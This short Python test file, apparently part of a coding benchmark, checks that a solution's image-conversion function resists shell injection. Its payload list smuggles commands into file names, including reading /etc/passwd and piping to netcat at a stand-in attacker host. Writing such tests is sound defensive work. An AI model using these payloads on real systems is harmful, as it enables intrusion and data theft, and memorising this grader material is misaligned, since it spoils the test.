from codetrust.tasks.testkit import load_solution, recorder

PAYLOADS = ['a.png; echo pwned', 'a.png && cat /etc/passwd', '$(whoami).png', 'a.png | nc attacker.test 9']


def test_no_shell_injection(recorder):
    sol = load_solution()
    for payload in PAYLOADS:
        recorder.calls.clear()
        try:
            sol.convert_image(payload, 'out.jpg')
        except Exception:
            pass
        assert not recorder.injected(payload), recorder.injected(payload)
